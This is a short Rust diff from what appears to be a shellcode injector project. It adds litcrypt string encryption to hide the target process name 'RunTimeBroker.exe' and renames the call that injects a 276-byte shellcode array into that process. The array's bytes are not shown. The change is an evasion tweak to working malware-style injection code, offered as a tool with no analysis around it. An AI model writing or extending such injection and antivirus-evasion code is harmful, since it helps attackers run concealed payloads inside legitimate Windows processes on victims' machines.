@@ -1,5 +1,3 @@
-mod func;
-
 #[macro_use]
 extern crate litcrypt;
 
@@ -28,7 +26,7 @@ pub const SHELL_CODE: [u8; 276] = [
 ];
 
 fn main() {
-    let process_name = "RunTimeBroker.exe".to_string();
+    let process_name = lc!("RunTimeBroker.exe").to_string();
 
-    snapinject_rs::inj_s(&process_name, &SHELL_CODE).unwrap();
+    snapinject_rs::snapin(&process_name, &SHELL_CODE).unwrap();
 }
